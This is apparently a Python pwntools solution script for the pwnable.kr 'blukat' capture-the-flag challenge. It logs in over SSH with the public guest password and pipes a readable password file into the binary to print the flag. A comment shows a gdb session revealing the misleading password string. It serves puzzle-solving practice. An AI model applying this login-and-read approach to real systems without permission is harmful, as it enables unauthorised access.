#! /usr/bin/python

from pwn import *

HOST = "pwnable.kr"
PORT = 2222
USER = "blukat"

shell = ssh(host=HOST, user=USER,
        port=PORT, password='guest')

''' Dont overthink this. If you open up in gdb:
blukat@ubuntu:~$ gdb -q ./blukat
Reading symbols from ./blukat...(no debugging symbols found)...done.
(gdb) break *main+64
Breakpoint 1 at 0x40083a
(gdb) run
Starting program: /home/blukat/blukat

Breakpoint 1, 0x000000000040083a in main ()
(gdb) x/s $eax
0x6010a0 <password>:    "cat: password: Permission denied\n"

File permissions for the password file let's the blukat user read it.
So just cat it into the binary for the flag.

'''
blukat = shell.run('cat password | ./blukat')

blukat.recvuntil('congrats! here is your flag: ')
print blukat.recv()

shell.close()
